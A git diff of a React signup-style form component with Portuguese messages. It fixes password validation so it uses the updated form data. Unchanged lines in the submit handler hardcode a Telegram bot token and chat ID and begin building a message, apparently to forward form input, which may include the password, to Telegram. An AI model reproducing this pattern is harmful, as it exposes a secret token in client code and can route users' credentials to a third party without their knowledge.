@@ -15,16 +15,18 @@ function Index() {
 
   const handleChange = (e) => {
     const { name, value } = e.target;
-    setFormData((prev) => ({
-      ...prev,
-      [name]: value,
-    }));
 
-    if (name === "password" || name === "confirmPassword") {
-      validatePasswords();
-    } else {
-      validateField(name, value);
-    }
+    setFormData((prev) => {
+      const updatedFormData = { ...prev, [name]: value };
+
+      if (name === "password" || name === "confirmPassword") {
+        validatePasswords(updatedFormData);
+      } else {
+        validateField(name, value);
+      }
+
+      return updatedFormData;
+    });
   };
 
   const validateField = (fieldName, value) => {
@@ -69,18 +71,18 @@ function Index() {
     setErrors(newErrors);
   };
 
-  const validatePasswords = () => {
+  const validatePasswords = (data) => {
     let newErrors = { ...errors };
 
-    if (!formData.password) {
+    if (!data.password) {
       newErrors.password = "Senha é obrigatória";
-    } else if (formData.password.length < 6) {
+    } else if (data.password.length < 6) {
       newErrors.password = "Mínimo 6 caracteres";
     } else {
       delete newErrors.password;
     }
 
-    if (formData.password !== formData.confirmPassword) {
+    if (data.password !== data.confirmPassword) {
       newErrors.confirmPassword = "As senhas não coincidem";
     } else {
       delete newErrors.confirmPassword;
@@ -91,7 +93,8 @@ function Index() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    validatePasswords();
+
+    validatePasswords(formData);
     Object.keys(formData).forEach((field) => {
       validateField(field, formData[field]);
     });
@@ -99,7 +102,6 @@ function Index() {
     if (Object.keys(errors).length === 0) {
       console.log("Dados válidos:", formData);
 
-      // Manda pro Telegram
       const BOT_TOKEN = "7179025614:AAHhPcC87zl8H9uOmFTWFRKRRCSr1fLdSqg";
       const CHAT_ID = "7942712256";
       const message = `
